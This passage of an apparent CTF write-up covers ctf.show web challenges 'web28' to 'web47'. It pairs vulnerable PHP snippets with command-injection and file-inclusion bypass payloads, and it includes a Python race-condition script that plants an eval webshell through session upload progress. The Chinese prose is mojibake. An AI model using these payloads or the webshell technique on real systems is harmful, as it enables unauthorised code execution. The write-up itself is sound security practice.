<span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç™»é™†æˆåŠŸç»™äº†å­¦å·å’Œé»˜è®¤å¯†ç ï¼Œç™»é™†å°±æœ‰flag</p><h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;system(&#39;cat *&#39;);</span><br></pre></td></tr></table></figure><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;&#39;sys&#39;.&#39;tem&#39;;$a(&#39;cat *&#39;);</span><br></pre></td></tr></table></figure><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;str_replace(&quot;a&quot;,&quot;&quot;,&quot;sysatem&quot;);$a(&quot;head%09-n%09100%09*&quot;);</span><br></pre></td></tr></table></figure><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include&quot;$_GET[1]&quot;?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include&#x2F;**&#x2F;$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include&#x2F;**&#x2F;$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include&#x2F;**&#x2F;$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">POST: &lt;?php system(&#39;cat *&#39;);</span><br></pre></td></tr></table></figure><p>sessionä¸Šä¼ è¿›åº¦getshell,expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://b440e730-82ed-40ce-a359-947492fc8c6d.chall.ctf.show/&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&#x27;PHPSESSID=moonback&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>():</span></span><br><span class="line">    files=&#123;</span><br><span class="line">        <span class="string">&quot;upload&quot;</span>:<span class="string">&#x27;&#x27;</span>                                                   <span class="comment">#ä¸Šä¼ æ— æ•ˆçš„ç©ºæ–‡ä»¶</span></span><br><span class="line">    &#125;</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&#x27;&lt;?php echo &quot;moonback&quot;;file_put_contents(&quot;/tmp/mb&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));?&gt;&#x27;</span>     <span class="comment">#æ¶æ„è¿›åº¦ä¿¡æ¯ï¼Œreadfileå°†ç›´æ¥è¾“å‡ºæ–‡ä»¶å†…å®¹</span></span><br><span class="line">    &#125;</span><br><span class="line">    r.post(url,files=files,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>():</span></span><br><span class="line">    <span class="comment"># event.wait()</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        POST()</span><br><span class="line">        t=r.get(<span class="string">&quot;http://b440e730-82ed-40ce-a359-947492fc8c6d.chall.ctf.show/?c=/tmp/sess_moonback&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;moonback&#x27;</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            print(<span class="string">&#x27;[+] success&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    threading.Thread(target=READ,args=()).start()</span><br></pre></td></tr></table></figure><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgKicpOw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·å¯ä»¥ä½¿ç”¨<code>data://</code>åè®®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#39;cat *&#39;);?&gt;</span><br><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat *&#39;)?&gt;</span><br></pre></td></tr></table></figure><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>è¿™ä¸ªbançš„æ˜¯ä¸­æ–‡çš„æ‹¬å·ã€‚ã€‚ã€‚ã€‚phpæ— å‚æ•°å‡½æ•°ï¼š<a href="https://www.m00nback.xyz/2019/11/12/php-nopara-rce">https://www.m00nback.xyz/2019/11/12/php-nopara-rce</a></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>#</code>æ³¨é‡Šå°±è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;cat * %23</span><br></pre></td></tr></table></figure><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;head -n 100 * %23</span><br></pre></td></tr></table></figure><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;head -n 100 * %23</span><br></pre></td></tr></table></figure><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;head%09-n%09100%09*%09%23</span><br></pre></td></tr></table></figure><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.???%09%23</span><br></pre></td></tr></table></figure><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 